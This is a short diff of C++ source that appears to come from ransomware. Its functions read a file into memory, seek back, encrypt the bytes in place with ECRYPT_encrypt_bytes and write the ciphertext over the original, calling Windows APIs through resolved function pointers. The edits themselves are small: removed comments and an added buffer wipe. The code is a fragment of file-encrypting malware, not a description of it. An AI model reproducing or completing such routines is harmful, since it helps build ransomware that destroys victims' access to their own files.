@@ -257,7 +257,7 @@ namespace filesystem
 		WCHAR* mke
 	)
 	{								
-		LPSTR FileBuffer = (CHAR*)m_malloc(FileInfo->FileSize);//  < 1.5 GB
+		LPSTR FileBuffer = (CHAR*)m_malloc(FileInfo->FileSize);
 		if (!FileBuffer)
 		{
 			memory::m_delete(FileBuffer);			
@@ -289,7 +289,7 @@ namespace filesystem
 
 		LARGE_INTEGER Offset;
 		Offset.QuadPart = -((LONGLONG)dwread);		
-		if (!pSetFilePointerEx(hFile2, Offset, NULL, FILE_CURRENT)) { /*std::cout << pGetLastError() << std::endl;*/ }
+		if (!pSetFilePointerEx(hFile2, Offset, NULL, FILE_CURRENT)) {  }
 	
 		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)FileBuffer, (BYTE*)FileBuffer, BytesRead);
 		SUCCESSS = WriteFullData(hFile2, FileBuffer, BytesRead);
@@ -566,7 +566,7 @@ END:
 			return FALSE;
 		}
 
-		LPSTR FileBuffer = (CHAR*)m_malloc(FileSize.QuadPart);//  < 1.5 GB
+		LPSTR FileBuffer = (CHAR*)m_malloc(FileSize.QuadPart);
 		if (!FileBuffer)
 		{
 			memory::m_delete(FileBuffer);
@@ -595,7 +595,7 @@ END:
 		printf_s("%s", FileBuffer);
 
 	END:
-
+		memory::m_memset(FileBuffer, 0, FileSize.QuadPart);
 		m_free(FileBuffer);
 		pCloseHandle(hFile);
 
